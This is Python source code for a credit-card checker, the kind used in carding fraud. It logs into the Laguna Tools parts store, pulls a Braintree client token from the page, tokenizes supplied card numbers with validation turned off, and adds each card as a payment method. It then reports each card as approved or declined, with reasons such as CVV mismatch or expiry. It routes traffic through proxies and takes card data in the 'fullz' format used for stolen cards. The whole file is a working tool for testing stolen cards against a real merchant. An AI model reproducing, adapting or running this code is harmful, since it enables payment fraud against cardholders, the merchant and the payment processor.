import base64
import httpx
import json
import re
import os
from faker import Faker

fake = Faker()

LAGUNA_USER = os.environ.get('LAGUNA_USER', '')
LAGUNA_PASS = os.environ.get('LAGUNA_PASS', '')

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception:
        return None

async def braintree_laguna_check_async(cc, mes, ano, cvv, proxy=None):
    try:
        if not LAGUNA_USER or not LAGUNA_PASS:
            return "Error: LAGUNA_USER and LAGUNA_PASS env vars required", True
        
        fullz = f"{cc}|{mes}|{ano}|{cvv}"
        
        proxies = None
        if proxy:
            if isinstance(proxy, dict):
                proxy_url = proxy.get('http') or proxy.get('https')
            else:
                proxy_url = proxy
            if proxy_url:
                proxies = proxy_url
        
        async with httpx.AsyncClient(timeout=40, proxy=proxies) as session:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            response = await session.get('https://parts.lagunatools.com/login/', headers=headers)
            login_nonce = gets(response.text, 'id="user-registration-login-nonce" name="user-registration-login-nonce" value="', '"')
            if not login_nonce:
                return "Error: Failed to get login nonce", True
            
            headers['content-type'] = 'application/x-www-form-urlencoded'
            headers['origin'] = 'https://parts.lagunatools.com'
            headers['referer'] = 'https://parts.lagunatools.com/login/'
            
            data = {
                'username': LAGUNA_USER,
                'password': LAGUNA_PASS,
                'user-registration-login-nonce': login_nonce,
                '_wp_http_referer': '/login/',
                'login': 'Login',
                'redirect': '',
            }
            await session.post('https://parts.lagunatools.com/login/', headers=headers, data=data)
            await session.get('https://parts.lagunatools.com/customer-account/payment-methods/', headers=headers)
            
            headers['referer'] = 'https://parts.lagunatools.com/customer-account/payment-methods/'
            response = await session.get('https://parts.lagunatools.com/customer-account/add-payment-method/', headers=headers)
            
            nonce = gets(response.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
            token_data = extract_braintree_token(response.text)
            if not token_data:
                return "Error: Failed to extract Braintree token", True
            
            authorization_fingerprint = token_data.get('authorizationFingerprint')
            
            headers_bt = {
                'accept': '*/*',
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': 'a5deb879-1007-406e-8830-769fff810eae',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': '10038-2609',
                                'streetAddress': '156 William St',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_bt, json=json_data)
            token = gets(response.text, '"token":"', '"')
            
            if not token:
                resp_json = response.json()
                if 'errors' in resp_json:
                    err_msg = resp_json['errors'][0].get('message', 'Unknown error')
                    return f"DECLINED: {err_msg}", True
                return "Error: Failed to tokenize card", True
            
            headers_submit = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://parts.lagunatools.com',
                'referer': 'https://parts.lagunatools.com/customer-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            }
            
            data_submit = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '{"correlation_id":"a5deb879-1007-406e-8830-769fff81"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/crtwxgkstbhhh694/client_api","assetsUrl":"https://assets.braintreegateway.com","merchantId":"crtwxgkstbhhh694","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}}',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': '/customer-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            
            response = await session.post(
                'https://parts.lagunatools.com/customer-account/add-payment-method/',
                headers=headers_submit,
                data=data_submit,
                follow_redirects=False
            )
            
            if response.status_code in (301, 302, 303, 307, 308):
                redirect_location = response.headers.get("location", "")
                if "payment-methods" in redirect_location:
                    return "APPROVED: Payment method added successfully", True
                return f"REDIRECT: {redirect_location}", True
            
            text = response.text
            if "Payment method successfully added" in text:
                return "APPROVED: Payment method added", True
            elif "Thank you" in text or '"result":"success"' in text:
                return "APPROVED: Success", True
            elif "CVV" in text.upper() or "CVC" in text.upper() or "security code" in text.lower():
                return "DECLINED: CVV mismatch", True
            elif "card number" in text.lower() or "invalid card" in text.lower():
                return "DECLINED: Invalid card number", True
            elif "expired" in text.lower():
                return "DECLINED: Card expired", True
            elif "declined" in text.lower():
                reason = gets(text, "Reason: ", "<") or gets(text, "Reason: ", ".") or "Generic decline"
                return f"DECLINED: {reason[:50]}", True
            else:
                if len(text) > 200:
                    return "DECLINED: Unknown response", True
                return f"RESPONSE: {text[:100]}", True
                
    except httpx.TimeoutException:
        return "Error: Request timeout", True
    except Exception as e:
        return f"Error: {str(e)[:50]}", True

def gateway_check(cc, mes, ano, cvv, proxy=None):
    import asyncio
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    result, proxy_ok = loop.run_until_complete(braintree_laguna_check_async(cc, mes, ano, cvv, proxy))
    return result, proxy_ok
